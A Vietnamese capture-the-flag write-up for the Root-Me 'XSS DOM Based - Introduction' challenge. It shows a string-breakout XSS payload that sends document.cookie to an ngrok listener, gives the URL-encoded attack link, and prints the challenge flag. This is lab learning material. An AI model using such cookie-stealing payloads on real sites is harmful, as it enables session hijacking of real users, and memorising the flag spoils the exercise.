# XSS DOM Based - Introduction
## Solution
Đầu tiên challenge cho chúng ta một 1 cái form như thế này.

![image](https://user-images.githubusercontent.com/86184794/159858743-f113a948-b3b4-4a33-805f-cb6572f20120.png)

Thử nhập bất kỳ kí tự gì vào form xem sao.

![image](https://user-images.githubusercontent.com/86184794/159858918-e5086ada-42dd-4916-b9c8-6c5831e5eae3.png)


Khi nhập chuỗi kí tự 'binh' thì trên url xuất hiện request vào tham số number=binh và trong deptool cũng xuất hiện một cái biến number lưu giá trị 'binh'.

Như vậy ý tưởng xử lý challenge này là em sẽ đi nhập một đoạn chuỗi javascript vào để chương trình thực thi.
Ví dụ number='binh' thì chuỗi 'binh' em sẽ thay là '; alert("1"); var taolao='

Với việc thay đổi như này thì kết quả là number = ''; alert("1"); var taolao='' như vậy thì câu lệnh alert("1") sẽ được thực thi.

Như vậy bây giờ chúng ta sẽ đưa code vào để lừa lấy cookie của server xong gửi cookie này vể server ảo của dưới sự kiểm soát của chúng ta.

Tạo server lắng nghe ở port 11111

![image](https://user-images.githubusercontent.com/86184794/159861535-a4457eb9-4d16-4414-a93a-a081b5842133.png)

Sau đó public server ra internet với ngrok.


![image](https://user-images.githubusercontent.com/86184794/159861649-2bbf2a44-480a-4fe5-934f-1256b394fb33.png)


Sau đó đưa vào payload là '; document.location="http://39ed-113-161-66-224.ngrok.io?cookie=" + document.cookie; var taolao=' ô input

![image](https://user-images.githubusercontent.com/86184794/159871769-c8735f22-a9b2-430b-a9d1-03083e1cfaf6.png)


Nhưng khi gửi payload vào khá lâu nhưng không có cookie nào trả lại nên em thử sang tag contact của challenge để thử xem. Nhưng bên tag này thì yêu cầu gửi đường link url nên em sẽ convert đoạn code này sang dạng url rồi thêm đường link gốc vào để được url hoàn chỉnh.

```
%27%3B%20document.location%3D%22http%3A%2F%2F39ed-113-161-66-224.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie%3B%20var%20taolao%3D%27
```

Link hoàn chỉnh để attack server như sau

```
http://challenge01.root-me.org/web-client/ch32/index.php?number=%27%3B%20document.location%3D%22http%3A%2F%2Ff5be-123-21-33-242.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie%3B%20var%20taolao%3D%27
```


Khi submit đường link này thì ta được kết quả

![image](https://user-images.githubusercontent.com/86184794/159872849-55a5fdca-47b0-41d5-9f56-6a5587425c3e.png)

Flag: rootme{XSS_D0M_BaSed_InTr0}
